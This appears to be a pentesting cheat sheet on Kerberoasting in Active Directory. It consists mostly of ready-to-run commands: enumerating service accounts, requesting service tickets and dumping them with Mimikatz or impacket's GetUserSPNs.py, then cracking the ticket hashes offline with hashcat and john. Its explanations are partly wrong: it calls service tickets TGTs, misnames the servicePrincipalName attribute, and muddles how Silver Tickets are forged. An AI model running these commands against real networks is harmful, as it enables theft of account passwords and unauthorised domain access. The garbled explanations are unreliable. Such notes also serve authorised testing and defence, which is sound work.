# Kerberoast

Send a request to a TGT for a Kerberos token, dump it from memory, crack it locally to obtain access to the target. The TGT can also be used to forge a Silver Ticket and gain access to the service machine. Vulnerable accounts need to have the flag `serverPrincipalName` set.

## Exploit

### Windows machine

Vulnerable users in domain

```
Get-NetUser | Where-Object {$_.servicePrincipalName} | fl

get-adobject | Where-Object {$_.serviceprincipalname -ne $null -and $_.distinguishedname -like "*CN=Users*" -and $_.cn -ne "krbtgt"}
get-adobject -filter {serviceprincipalname -ne $null} -prop serviceprincipalname

setspn -T <domain> -Q */*
```

Enumerate past remote sessions on local machine

```
klist
```

Request a Service Ticket from the target. The ticket will be stored in memory

```
Add-Type -AssemblyName System.IdentityModel  
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"
```

Dump the SPN ticket using Mimikatz

```
privilege::debug
token::elevate
kerberos::list /export
```

### \*nix machine

Enumerate vulnerable accounts. Requires a valid user and password

```
GetUserSPNs.py <domain>/<user>:<pass>            #check user
GetUserSPNs.py -dc-ip <DC IP> <domain>/<user>    #query the DC
```

Dump TGT

```
GetUserSPNs.py <domain>/<user>:<pass> -request  #dump TGTs of current user
GetUserSPNs.py -dc-ip <DC IP> <domain>/<user> -request-user <target user> #dump TGTs of target user
```

## Crack hash

Crack the .kirbi file or hash received from impacket

```
hashcat -m 13100 --force <hashfile> <wordlist>
john --format=krb5tgs --wordlist=<wordlist> <hashfile>    #requires jumbo version
```